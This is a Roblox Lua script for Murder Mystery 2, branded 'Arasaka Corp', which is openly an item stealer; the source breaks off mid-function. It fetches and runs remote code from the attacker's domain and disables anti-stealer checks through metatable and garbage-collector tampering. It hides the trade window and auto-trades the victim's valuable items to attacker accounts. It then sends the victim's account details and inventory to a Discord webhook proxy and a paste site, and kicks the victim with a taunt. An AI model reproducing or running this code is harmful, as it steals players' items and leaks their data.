repeat task.wait() until game:IsLoaded()
task.wait(1.5)

_G.EdMM2Exe = _G.EdMM2Exe or false
if _G.EdMM2Exe then return end
_G.EdMM2Exe = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
if not plr then return end

if game.PlaceId ~= 142823291 then
	pcall(function() plr:Kick("Arasaka Corp | MM2 Only") end)
	return
end

if not _G.AC_CONFIG then
	warn("[AC] Execute loader first!")
	return
end

local cfg = _G.AC_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_PROXY = cfg.PUBLIC_PROXY
local MinRarity = cfg.MinRarity or "Common"

if not WEBHOOK_ID or WEBHOOK_ID == "" then
	warn("[AC] Invalid webhook")
	return
end
if not USERNAMES or #USERNAMES == 0 then
	warn("[AC] No targets")
	return
end

local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")

local Constants = {
	PlaceId = 142823291,
	MaxTradeSlots = 4,
	TradeTimeout = 30,
	RequestCooldown = 0.5,
	TradeWait = 5,
	JoinWait = 1,
	ServerListLimit = 100,
	MinServerPlayers = 12,
	PastefyEndpoint = "https://pastefy.app/api/v2/paste",
	ValuesEndpoint = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2",
	ServersEndpoint = "https://games.roblox.com/v1/games/",
	NoTrade = {
		DefaultGun = true, DefaultKnife = true, Reaver = true,
		Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
		IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true,
		IceHammer_Ancient = true, Gingerscythe = true, Gingerscythe_Legendary = true,
		Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
		TestItem = true, Season1TestKnife = true, Cracks = true,
		Icecrusher = true, ["???"] = true, Dartbringer = true,
		TravelerAxeRed = true, TravelerAxeBronze = true,
		TravelerAxeSilver = true, TravelerAxeGold = true,
		BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
	},
	RarityOrder = {Ancient = 9, Godly = 8, Unique = 7, Vintage = 6, Legendary = 5, Rare = 4, Uncommon = 3, Common = 2},
	EmojiMap = {Ancient = "🔴", Godly = "🟣", Unique = "🟡", Vintage = "🟠", Legendary = "🔵", Rare = "🟢", Uncommon = "⚪", Common = "⚫"},
	Brand = {
		Name = "Arasaka Corp",
		Footer = "Arasaka Corp v1.0.2",
		Discord = "https://discord.gg/arasaka-corp"
	}
}

local Executor = {
	Name = "Unknown",
	IsDelta = false,
	SupportsHook = false,
	SupportsFireSignal = false,
	SupportsGetConnections = false
}

pcall(function()
	if identifyexecutor then Executor.Name = identifyexecutor() end
	if getexecutorname then Executor.Name = getexecutorname() end
end)
Executor.IsDelta = Executor.Name:lower():find("delta") ~= nil
Executor.SupportsHook = hookfunction ~= nil and newcclosure ~= nil
Executor.SupportsFireSignal = firesignal ~= nil
Executor.SupportsGetConnections = getconnections ~= nil

local function requestFn(req)
	if syn and syn.request then return syn.request(req) end
	if fluxus and fluxus.request then return fluxus.request(req) end
	if http and http.request then return http.request(req) end
	if getgenv().request then return getgenv().request(req) end
	if request then return request(req) end
	if http_request then return http_request(req) end
	if HttpService.RequestAsync then
		return HttpService:RequestAsync({
			Url = req.Url, Method = req.Method,
			Headers = req.Headers, Body = req.Body
		})
	end
	return nil
end

local Security = {}
function Security.LockHttp()
	if not Executor.SupportsHook then return end
	local function guard(fn)
		if typeof(fn) ~= "function" then return end
		local old; old = hookfunction(fn, newcclosure(function(...)
			local args = {...}
			if #args > 0 and typeof(args[1]) == "table" then
				local url = args[1].Url or args[1].url or ""
				if typeof(url) == "string" then
					if url:find("webhook") or url:find("discord") or url:find("pastefy") or url:find("project-reverse") or url:find("fern.wtf") or url:find("games.roblox.com") or url:find("arasaka-corp") then
						return old(...)
					end
				end
			end
			return old(...)
		end))
	end
	if syn and syn.request then guard(syn.request) end
	if fluxus and fluxus.request then guard(fluxus.request) end
	if http and http.request then guard(http.request) end
	if getgenv().request then guard(getgenv().request) end
	if request then guard(request) end
	if http_request then guard(http_request) end
	if HttpService.RequestAsync then
		local old; old = hookfunction(HttpService.RequestAsync, newcclosure(function(self, ...)
			return old(self, ...)
		end))
	end
	local mt = getrawmetatable and getrawmetatable(game)
	if mt then
		setreadonly(mt, false)
		local old = mt.__namecall
		mt.__namecall = newcclosure(function(self, ...)
			local m = getnamecallmethod()
			if m == "HttpGet" or m == "HttpGetAsync" or m == "RequestAsync" then
				return old(self, ...)
			end
			return old(self, ...)
		end)
		setreadonly(mt, true)
	end
	if Executor.SupportsGetConnections then
		pcall(function()
			for _, conn in ipairs(getconnections(HttpService.RequestQueueEmpty)) do
				if conn and conn.Disable then conn:Disable() end
			end
		end)
	end
end

local State = {
	JobId = game.JobId,
	RealJobId = game.JobId,
	DeltaBypassed = false,
	Database = nil,
	Profile = nil,
	Values = {},
	Inventory = {},
	InventoryQueue = {},
	TotalValue = 0,
	RarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0},
	TradeCompleted = false
}

_G.ED_STATE = State

local Network = {}
function Network.ServerHop()
	local ok, res = pcall(function()
		local r = requestFn({
			Url = Constants.ServersEndpoint .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=" .. Constants.ServerListLimit,
			Method = "GET",
			Headers = {["User-Agent"] = "Mozilla/5.0"}
		})
		if r and r.Body then
			local d = HttpService:JSONDecode(r.Body)
			if d and d.data then
				for _, s in ipairs(d.data) do
					if s.id ~= game.JobId and s.playing < s.maxPlayers then
						TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, plr)
						task.wait(5)
						return
					end
				end
			end
		end
	end)
	if not ok then warn("[AC] ServerHop failed: " .. tostring(res)) end
end
function Network.FetchValues()
	local ok, res = pcall(function()
		return requestFn({
			Url = Constants.ValuesEndpoint,
			Method = "GET",
			Headers = {["User-Agent"] = "Mozilla/5.0"}
		})
	end)
	if ok and res and res.Body then
		local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
		if ok2 and data and data.data then
			for _, item in ipairs(data.data) do
				if item.name and item.price then
					State.Values[item.name] = tonumber(item.price) or 0
				end
			end
		end
	end
end

local Data = {}
function Data.LoadDatabase()
	local ok, db = pcall(function()
		return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
	end)
	if ok and db then
		State.Database = db
	else
		warn("[AC] Database load failed")
	end
end
function Data.LoadProfile()
	local ok, prof = pcall(function()
		return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
	end)
	if ok and prof then
		State.Profile = prof
	else
		warn("[AC] Profile load failed")
	end
end
function Data.ProcessInventory()
	if not State.Database or not State.Profile then return end
	local owned = State.Profile.Weapons and State.Profile.Weapons.Owned or {}
	local minRarityIndex = Constants.RarityOrder[MinRarity] or 2
	State.Inventory = {}
	State.TotalValue = 0
	State.RarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
	for dataid, amount in pairs(owned) do
		local item = State.Database[dataid]
		if item and not Constants.NoTrade[dataid] and amount > 0 then
			local rarity = item.Rarity or "Common"
			local rarityIndex = Constants.RarityOrder[rarity] or 2
			if rarityIndex < minRarityIndex then
				continue
			end
			local name = item.ItemName or tostring(dataid)
			local value = State.Values[dataid] or 0
			local total = value * amount
			State.TotalValue = State.TotalValue + total
			table.insert(State.Inventory, {
				DataID = dataid,
				ItemName = name,
				Amount = amount,
				Rarity = rarity,
				Value = value,
				TotalValue = total
			})
			State.RarityCounts[rarity] = (State.RarityCounts[rarity] or 0) + amount
		end
	end
	table.sort(State.Inventory, function(a, b) return a.Value > b.Value end)
	State.InventoryQueue = {}
	for _, item in ipairs(State.Inventory) do
		table.insert(State.InventoryQueue, {DataID = item.DataID, Amount = item.Amount})
	end
end
function Data.RefreshInventory()
	if not State.Database or not State.Profile then return end
	local owned = State.Profile.Weapons and State.Profile.Weapons.Owned or {}
	local minRarityIndex = Constants.RarityOrder[MinRarity] or 2
	State.Inventory = {}
	State.TotalValue = 0
	State.RarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
	for dataid, amount in pairs(owned) do
		local item = State.Database[dataid]
		if item and not Constants.NoTrade[dataid] and amount > 0 then
			local rarity = item.Rarity or "Common"
			local rarityIndex = Constants.RarityOrder[rarity] or 2
			if rarityIndex < minRarityIndex then
				continue
			end
			local name = item.ItemName or tostring(dataid)
			local value = State.Values[dataid] or 0
			local total = value * amount
			State.TotalValue = State.TotalValue + total
			table.insert(State.Inventory, {
				DataID = dataid,
				ItemName = name,
				Amount = amount,
				Rarity = rarity,
				Value = value,
				TotalValue = total
			})
			State.RarityCounts[rarity] = (State.RarityCounts[rarity] or 0) + amount
		end
	end
	table.sort(State.Inventory, function(a, b) return a.Value > b.Value end)
	State.InventoryQueue = {}
	for _, item in ipairs(State.Inventory) do
		table.insert(State.InventoryQueue, {DataID = item.DataID, Amount = item.Amount})
	end
	return #State.InventoryQueue
end

local TradeEngine = {}
TradeEngine.Remote = {
	SendRequest = nil,
	GetStatus = nil,
	OfferItem = nil,
	AcceptTrade = nil,
	DeclineTrade = nil,
	DeclineRequest = nil,
	CancelRequest = nil,
	UpdateTrade = nil,
	StartTrade = nil
}
TradeEngine.GUIs = {}
TradeEngine.LastOffer = nil
TradeEngine.IsOurTrade = false
TradeEngine.ActivePartner = nil
TradeEngine.IsProcessing = false
TradeEngine.ProcessedUsers = {}

function TradeEngine.InitRemotes()
	local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
	if not Trade then
		warn("[AC] Trade remote missing")
		return false
	end
	TradeEngine.Remote.SendRequest = Trade:WaitForChild("SendRequest")
	TradeEngine.Remote.GetStatus = Trade:WaitForChild("GetTradeStatus")
	TradeEngine.Remote.OfferItem = Trade:WaitForChild("OfferItem")
	TradeEngine.Remote.AcceptTrade = Trade:WaitForChild("AcceptTrade")
	TradeEngine.Remote.DeclineTrade = Trade:WaitForChild("DeclineTrade")
	TradeEngine.Remote.DeclineRequest = Trade:FindFirstChild("DeclineRequest")
	TradeEngine.Remote.CancelRequest = Trade:FindFirstChild("CancelRequest")
	TradeEngine.Remote.UpdateTrade = Trade:FindFirstChild("UpdateTrade")
	TradeEngine.Remote.StartTrade = Trade:FindFirstChild("StartTrade")

	if TradeEngine.Remote.UpdateTrade then
		TradeEngine.Remote.UpdateTrade.OnClientEvent:Connect(function(data)
			if typeof(data) == "table" then
				if data.lastOffer then TradeEngine.LastOffer = data.lastOffer end
				if data.LastOffer then TradeEngine.LastOffer = data.LastOffer end
				TradeEngine.CheckTradePartner(data)
			end
		end)
	end

	if TradeEngine.Remote.StartTrade then
		TradeEngine.Remote.StartTrade.OnClientEvent:Connect(function(data, partnerName)
			TradeEngine.ActivePartner = partnerName
			if partnerName and not TradeEngine.IsTarget(partnerName) then
				warn("[AC] Unauthorized trade with " .. partnerName .. ", declining...")
				TradeEngine.DeclineTrade()
			end
		end)
	end

	if TradeEngine.Remote.CancelRequest then
		TradeEngine.Remote.CancelRequest.OnClientEvent:Connect(function()
			TradeEngine.IsOurTrade = false
		end)
	end

	local pg = plr:WaitForChild("PlayerGui")
	for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
		local g = pg:FindFirstChild(n)
		if g then
			g.Enabled = false
			g:GetPropertyChangedSignal("Enabled"):Connect(function()
				if g.Enabled then g.Enabled = false end
			end)
			TradeEngine.GUIs[n] = g
		end
	end

	pcall(function()
		local TradeModule = require(ReplicatedStorage:WaitForChild("Modules", 5):WaitForChild("TradeModule", 5))
		if TradeModule and TradeModule.RequestsEnabled ~= nil then
			TradeModule.RequestsEnabled = true
		end
	end)

	return true
end

function TradeEngine.CheckTradePartner(data)
	if not data then return end
	local p1 = data.Player1
	local p2 = data.Player2
	if not p1 or not p2 then return end

	local partner = nil
	if p1.Player and p1.Player.Name ~= plr.Name then
		partner = p1.Player.Name
	elseif p2.Player and p2.Player.Name ~= plr.Name then
		partner = p2.Player.Name
	end

	if partner and not TradeEngine.IsTarget(partner) then
		warn("[AC] Trade partner " .. partner .. " is not target, declining...")
		TradeEngine.DeclineTrade()
	end
end

function TradeEngine.GetStatus()
	local ok, s = pcall(function() return TradeEngine.Remote.GetStatus:InvokeServer() end)
	return ok and s or "None"
end
function TradeEngine.GetActiveGui()
	local pg = plr:WaitForChild("PlayerGui")
	return pg:FindFirstChild("TradeGUI") or pg:FindFirstChild("TradeGUI_Phone")
end
function TradeEngine.FireSignal(instance, signalName)
	if not instance then return end
	pcall(function()
		if Executor.SupportsFireSignal then
			firesignal(instance[signalName])
			return
		end
	end)
	pcall(function()
		if instance[signalName] then instance[signalName]:Fire() end
	end)
end
function TradeEngine.FindButton(gui, names)
	if not gui then return nil end
	for _, n in ipairs(names) do
		local b = gui:FindFirstChild(n, true)
		if b and b:IsA("GuiButton") then return b end
	end
	return nil
end
function TradeEngine.FindItemButton(dataId)
	local gui = TradeEngine.GetActiveGui()
	if not gui then return nil end
	local container = gui:FindFirstChild("Items", true) or gui:FindFirstChild("Inventory", true) or gui
	for _, b in ipairs(container:GetDescendants()) do
		if b:IsA("ImageButton") or b:IsA("TextButton") then
			local idVal = b:FindFirstChild("DataID") or b:FindFirstChild("ItemID")
			if idVal and idVal.Value == dataId then return b end
		end
	end
	return nil
end
function TradeEngine.SendRequest(target)
	TradeEngine.IsOurTrade = true
	local ok = pcall(function() TradeEngine.Remote.SendRequest:InvokeServer(target) end)
	if not ok then
		local gui = TradeEngine.GetActiveGui()
		local btn = TradeEngine.FindButton(gui, {"Send", "SendRequest", "Trade", "Request"})
		if btn then
			TradeEngine.FireSignal(btn, "MouseButton1Click")
			TradeEngine.FireSignal(btn, "Activated")
		end
	end
end
function TradeEngine.CancelRequest()
	local ok = pcall(function()
		if TradeEngine.Remote.CancelRequest then
			TradeEngine.Remote.CancelRequest:FireServer()
		end
	end)
	TradeEngine.IsOurTrade = false
end
function TradeEngine.DeclineTrade()
	TradeEngine.IsOurTrade = false
	TradeEngine.ActivePartner = nil
	local ok = pcall(function() TradeEngine.Remote.DeclineTrade:FireServer() end)
	if not ok then
		local gui = TradeEngine.GetActiveGui()
		local btn = TradeEngine.FindButton(gui, {"Decline", "DeclineTrade", "Reject", "No"})
		if btn then
			TradeEngine.FireSignal(btn, "MouseButton1Click")
			TradeEngine.FireSignal(btn, "Activated")
		end
	end
	task.wait(0.3)
end
function TradeEngine.DeclineIncoming()
	TradeEngine.IsOurTrade = false
	local ok = pcall(function()
		if TradeEngine.Remote.DeclineRequest then
			TradeEngine.Remote.DeclineRequest:FireServer()
		else
			TradeEngine.Remote.DeclineTrade:FireServer()
		end
	end)
	if not ok then
		local gui = TradeEngine.GetActiveGui()
		local btn = TradeEngine.FindButton(gui, {"Decline", "DeclineTrade", "Reject", "No"})
		if btn then
			TradeEngine.FireSignal(btn, "MouseButton1Click")
			TradeEngine.FireSignal(btn, "Activated")
		end
	end
	task.wait(0.3)
end
function TradeEngine.AddToOffer(dataId)
	local ok = pcall(function() TradeEngine.Remote.OfferItem:FireServer(dataId, "Weapons") end)
	task.wait(0.1)
	if not ok then
		local btn = TradeEngine.FindItemButton(dataId)
		if btn then
			TradeEngine.FireSignal(btn, "MouseButton1Click")
			TradeEngine.FireSignal(btn, "Activated")
		end
	end
end
function TradeEngine.AcceptDeal()
	local ok = pcall(function()
		TradeEngine.Remote.AcceptTrade:FireServer(game.PlaceId * 3, TradeEngine.LastOffer or {})
	end)
	if not ok then
		local gui = TradeEngine.GetActiveGui()
		local btn = TradeEngine.FindButton(gui, {"Accept", "AcceptTrade", "AcceptBtn", "Confirm"})
		if btn then
			TradeEngine.FireSignal(btn, "MouseButton1Click")
			TradeEngine.FireSignal(btn, "Activated")
		end
	end
end
function TradeEngine.WaitUntilDone()
	repeat task.wait(0.1) until TradeEngine.GetStatus() == "None"
	TradeEngine.IsOurTrade = false
	TradeEngine.ActivePartner = nil
end
function TradeEngine.IsTarget(name)
	for _, u in ipairs(USERNAMES) do
		if u:lower() == name:lower() then return true end
	end
	return false
end
function TradeEngine.SnipeGuard()
	local status = TradeEngine.GetStatus()
	if status == "ReceivingRequest" then
		TradeEngine.DeclineIncoming()
		return true
	end
	if status == "StartTrade" and not TradeEngine.IsOurTrade then
		TradeEngine.DeclineTrade()
		return true
	end
	return false
end
function TradeEngine.Jitter()
	return 0.3 + (math.random() * 0.4)
end
function TradeEngine.AggressiveMonitor()
	local status = TradeEngine.GetStatus()
	if status == "ReceivingRequest" then
		TradeEngine.DeclineIncoming()
	elseif status == "StartTrade" then
		local partner = TradeEngine.ActivePartner
		if partner and not TradeEngine.IsTarget(partner) then
			TradeEngine.DeclineTrade()
		end
	end
end
function TradeEngine.ProcessUser(playerName)
	if TradeEngine.IsProcessing then return end
	if TradeEngine.ProcessedUsers[playerName] then return end
	TradeEngine.IsProcessing = true
	TradeEngine.ProcessedUsers[playerName] = true
	local player = Players:FindFirstChild(playerName)
	if player then
		TradeEngine.Execute(player)
	end
	TradeEngine.ProcessedUsers[playerName] = nil
	TradeEngine.IsProcessing = false
end
function TradeEngine.CheckAndProcess()
	if TradeEngine.IsProcessing then return end
	for _, name in ipairs(USERNAMES) do
		local player = Players:FindFirstChild(name)
		if player and player.Character and player.Character:FindFirstChild("Humanoid") then
			if not TradeEngine.ProcessedUsers[name] then
				task.spawn(function() TradeEngine.ProcessUser(name) end)
				return
			end
		end
	end
end

function TradeEngine.Execute(targetPlayer)
	if not targetPlayer then return end
	local attempts = 0
	while attempts < 30 do
		if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then break end
		attempts = attempts + 1
		task.wait(0.5)
	end
	Data.RefreshInventory()
	local queue = {}
	for _, item in ipairs(State.Inventory) do
		table.insert(queue, {DataID = item.DataID, Amount = item.Amount})
	end
	if #queue == 0 then
		warn("[AC] No items to trade")
		return
	end
	while #queue > 0 and not State.TradeCompleted do
		TradeEngine.CancelRequest()
		if TradeEngine.SnipeGuard() then
			task.wait(0.5)
			continue
		end
		local started = false
		local sendAttempts = 0
		while not started and sendAttempts < Constants.TradeTimeout do
			local cur = TradeEngine.GetStatus()
			if cur == "StartTrade" then
				started = true
				break
			elseif cur == "None" then
				TradeEngine.SendRequest(targetPlayer)
			elseif cur == "ReceivingRequest" then
				TradeEngine.DeclineIncoming()
			end
			sendAttempts = sendAttempts + 1
			task.wait(TradeEngine.Jitter())
		end
		if started then
			local slotsLeft = Constants.MaxTradeSlots
			local itemsAdded = 0
			while slotsLeft > 0 and #queue > 0 do
				local current = queue[1]
				local amountToAdd = math.min(slotsLeft, current.Amount)
				for _ = 1, amountToAdd do
					TradeEngine.AddToOffer(current.DataID)
				end
				current.Amount = current.Amount - amountToAdd
				if current.Amount <= 0 then
					table.remove(queue, 1)
				end
				slotsLeft = slotsLeft - amountToAdd
				itemsAdded = itemsAdded + amountToAdd
			end
			if itemsAdded == 0 then break end
			task.wait(Constants.TradeWait)
			TradeEngine.AcceptDeal()
			TradeEngine.WaitUntilDone()
			Data.RefreshInventory()
			queue = {}
			for _, item in ipairs(State.Inventory) do
				table.insert(queue, {DataID = item.DataID, Amount = item.Amount})
			end
			if #queue == 0 then
				State.TradeCompleted = true
				break
			end
			if #queue > 0 then
				task.wait(1)
			end
		else
			task.wait(2)
		end
	end
	if #queue == 0 then
		State.TradeCompleted = true
		task.wait(2)
		pcall(function() setclipboard(Constants.Brand.Discord) end)
		pcall(function()
			plr:Kick("Arasaka Corp | Your Items got Stolen\n\n" .. Constants.Brand.Discord:gsub("https://", ""))
		end)
	end
end

local Webhook = {}

local function FormatValue(n)
	n = tonumber(n) or 0
	if n >= 1E6 then return string.format("$%.2fM", n / 1E6)
	elseif n >= 1E3 then return string.format("$%.2fK", n / 1E3)
	else return string.format("$%.2f", n) end
end

function Webhook.UploadToPastefy(items)
	if not items or #items == 0 then return nil end
	table.sort(items, function(a, b)
		local ao = Constants.RarityOrder[a.Rarity] or 1
		local bo = Constants.RarityOrder[b.Rarity] or 1
		if ao ~= bo then return ao > bo end
		return (a.Value or 0) > (b.Value or 0)
	end)
	local lines = {
		"ARASAKA CORP | MM2 Inventory Dump",
		"User: " .. plr.Name .. " (" .. plr.DisplayName .. ")",
		"Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
		"Total Value: " .. FormatValue(State.TotalValue or 0),
		"Total Items: " .. #items,
		string.rep("-", 60),
		""
	}
	local currentTier = nil
	for _, item in ipairs(items) do
		if currentTier ~= item.Rarity then
			currentTier = item.Rarity
			table.insert(lines, "")
			table.insert(lines, "[" .. tostring(currentTier):upper() .. "]")
			table.insert(lines, string.rep("-", 30))
		end
		local totalVal = (item.Value or 0) * (item.Amount or 1)
		table.insert(lines, string.format(
			"%s x%d | %s each | Total: %s",
			item.ItemName or "Unknown",
			tonumber(item.Amount) or 1,
			FormatValue(item.Value or 0),
			FormatValue(totalVal)
		))
	end
	local content = table.concat(lines, "\n")
	local ok, response = pcall(function()
		return requestFn({
			Url = Constants.PastefyEndpoint,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({content = content, type = "PASTE"})
		})
	end)
	if ok and response and response.StatusCode == 200 then
		local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
		if ok2 and data then
			if data.paste then return "https://pastefy.app/" .. data.paste.id
			elseif data.id then return "https://pastefy.app/" .. data.id end
		end
	end
	return nil
end

function Webhook.BuildPayload()
	local items = State.Inventory or {}
	local totalItems = 0
	local totalValue = State.TotalValue or 0
	local rarityCounts = State.RarityCounts or {}

	for _, item in ipairs(items) do
		totalItems = totalItems + (item.Amount or 1)
	end

	local hitCategory = "STANDARD HIT"
	local glowEffect = ""
	if totalValue >= 5000 then
		hitCategory = "INSANE HIT ($5K+)"
		glowEffect = "✦"
	elseif totalValue >= 2000 then
		hitCategory = "MASSIVE HIT ($2K+)"
		glowEffect = "🔥"
	elseif totalValue >= 500 then
		hitCategory = "BIG HIT ($500+)"
		glowEffect = "⚡"
	elseif totalValue >= 100 then
		hitCategory = "GOOD HIT ($100+)"
		glowEffect = "💫"
	elseif totalValue >= 15 then
		hitCategory = "NORMAL HIT ($15+)"
	else
		hitCategory = "LOW HIT (<$15)"
	end

	local topItems = {}
	for i = 1, math.min(5, #items) do
		local it = items[i]
		local icon = "░"
		local v = it.Value or 0
		if v >= 500 then icon = "█"
		elseif v >= 100 then icon = "▓"
		elseif v >= 25 then icon = "▒"
		end
		table.insert(topItems, string.format(
			"%s %s x%d | %s",
			icon, it.ItemName or "Unknown",
			tonumber(it.Amount) or 1,
			FormatValue(v)
		))
	end

	local pastefyLink = nil
	if #items > 0 then
		pastefyLink = Webhook.UploadToPastefy(items)
	end

	local realJob = State.RealJobId or game.JobId
	local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
	               .. "&gameInstanceId=" .. tostring(realJob)

	local fields = {
		{
			name = "VICTIM INFORMATION",
			value = "```yml\nUser: " .. plr.DisplayName .. " (@" .. plr.Name .. ")\n"
			     .. "ID: " .. tostring(plr.UserId) .. "\n"
			     .. "Age: " .. tostring(plr.AccountAge) .. " days\n"
			     .. "Server: " .. tostring(realJob):sub(1, 8) .. "\n```",
			inline = true
		},
		{
			name = "VALUATION",
			value = "```yml\nTotal Value: " .. FormatValue(totalValue) .. "\n"
			     .. "Items: " .. tostring(totalItems) .. "\n"
			     .. "Receiver: " .. table.concat(USERNAMES, ", ") .. "\n```",
			inline = true
		},
		{
			name = "INVENTORY BREAKDOWN",
			value = "```yml\n"
			     .. "Ancient: " .. tostring(rarityCounts.Ancient or 0)
			     .. " | Godly: " .. tostring(rarityCounts.Godly or 0) .. "\n"
			     .. "Unique: " .. tostring(rarityCounts.Unique or 0)
			     .. " | Vintage: " .. tostring(rarityCounts.Vintage or 0) .. "\n"
			     .. "Legendary: " .. tostring(rarityCounts.Legendary or 0)
			     .. " | Rare: " .. tostring(rarityCounts.Rare or 0) .. "\n"
			     .. "Uncommon: " .. tostring(rarityCounts.Uncommon or 0)
			     .. " | Common: " .. tostring(rarityCounts.Common or 0) .. "\n```",
			inline = false
		}
	}

	if #topItems > 0 then
		local topStr = "```prolog\n"
		for _, s in ipairs(topItems) do topStr = topStr .. s .. "\n" end
		topStr = topStr .. "```"
		table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
	end

	if pastefyLink then
		table.insert(fields, {
			name = "FULL INVENTORY",
			value = "[View All " .. tostring(#items) .. " Items on Pastefy](" .. pastefyLink .. ")",
			inline = false
		})
	end

	table.insert(fields, {
		name = "ACTIONS",
		value = "[Join Server](" .. fernLink .. ")",
		inline = false
	})

	local embedColor = 0x8B0000
	if totalValue >= 5000 then embedColor = 0xFF0000
	elseif totalValue >= 2000 then embedColor = 0xCC0000
	elseif totalValue >= 500 then embedColor = 0x990000
	elseif totalValue >= 100 then embedColor = 0x660000
	elseif totalValue >= 15 then embedColor = 0x440000
	end

	local embed = {
		title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
		color = embedColor,
		fields = fields,
		footer = {
			text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}

	local payload = {
		username = "Arasaka Corp",
		embeds = {embed}
	}

	if totalValue >= 500 or (rarityCounts.Ancient or 0) > 0 then
		payload.content = "@everyone **ARASAKA CORP | MM2 HIT**"
	end

	return payload, pastefyLink
end

function Webhook.SendWebhook(payload)
	local fullUrl = PROXY_URL .. WEBHOOK_ID
	local json = HttpService:JSONEncode(payload)
	local encrypted = crypto:Encrypt(json)

	local success, response = pcall(function()
		return requestFn({
			Url = fullUrl,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({data = encrypted})
		})
	end)
	return success, response
end

function Webhook.SendPublic(payload)
	if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
	local json = HttpService:JSONEncode(payload)
	local encrypted = crypto:Encrypt(json)

	local success, response = pcall(function()
		return requestFn({
			Url = PUBLIC_PROXY,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({message = encrypted})
		})
	end)
	return success, response
end

function Webhook.Dispatch()
	local payload, pastefyLink = Webhook.BuildPayload()
	Webhook.SendWebhook(payload)

	local publicPayload = {
		message = plr.Name .. " got hit by Arasaka Corp in MM2"
		       .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
	}
	Webhook.SendPublic(publicPayload)

	return payload
end

_G.ED_WEBHOOK = Webhook

local function BypassAntiStealer()
	pcall(function()
		local mt = getrawmetatable(game)
		if mt then
			setreadonly(mt, false)
			if mt.__namecall then mt.__namecall = nil end
			setreadonly(mt, true)
		end
		if hookfunction then
			local oldHook = hookfunction
			hookfunction = function(f, nf)
				if f == mt and nf then return oldHook(f, function(...) return ... end) end
				return oldHook(f, nf)
			end
		end
		for _, v in ipairs(getgc(true)) do
			if type(v) == "table" then
				for k, val in pairs(v) do
					if (k == "TradeAllowed" or k == "v_u_85") and type(val) == "boolean" then
						v[k] = true
					end
				end
			end
		end
		_G.TradeAllowed = true
		pcall(function()
			local TradeModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
			if TradeModule then
				TradeModule.RequestsEnabled = true
			end
		end)
	end)
end

local Controller = {}
function Controller.DeltaBypass()
	if not Executor.IsDelta then return end
	local stepAnimate = nil
	local found = false
	repeat
		for _, v in ipairs(getgc(true)) do
			if typeof(v) == "function" then
				local info = debug.getinfo(v)
				if info and info.name == "stepAnimate" then
					stepAnimate = v
					found = true
					break
				end
			end
		end
		task.wait(0.5)
	until found
	local printed = false
	local old; old = hookfunction(stepAnimate, function(dt)
		if not printed then
			printed = true
			State.RealJobId = game.JobId
			State.DeltaBypassed = true
		end
		return old(dt)
	end)
	repeat task.wait() until State.DeltaBypassed
end
function Controller.ValidateServer()
	local vip = false
	pcall(function()
		vip = (RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
	end)
	local full = (#Players:GetPlayers() >= Constants.MinServerPlayers)
	if vip or full then
		local kickExecutors = {"delta", "hydrogen", "fluxus", "arceus", "codex"}
		local shouldKick = false
		for _, e in ipairs(kickExecutors) do
			if Executor.Name:lower():find(e) then shouldKick = true; break end
		end
		if shouldKick then
			plr:Kick(vip and "VIP Servers not supported." or "FULL Servers Arent Supported")
			return false
		else
			print(vip and "VIP Server detected, hopping..." or "Server full, hopping...")
			Network.ServerHop()
			return false
		end
	end
	return true
end
function Controller.InitData()
	Data.LoadDatabase()
	Data.LoadProfile()
	Network.FetchValues()
	Data.ProcessInventory()
	if #State.Inventory == 0 then
		warn("[AC] No tradeable items found")
	end
end
function Controller.BindEvents()
	Players.PlayerAdded:Connect(function(player)
		if player == plr then return end
		if TradeEngine.IsTarget(player.Name) then
			task.spawn(function()
				task.wait(Constants.JoinWait)
				TradeEngine.CheckAndProcess()
			end)
		end
	end)
	Players.PlayerRemoving:Connect(function(player)
		if TradeEngine.IsTarget(player.Name) then
			TradeEngine.ProcessedUsers[player.Name] = nil
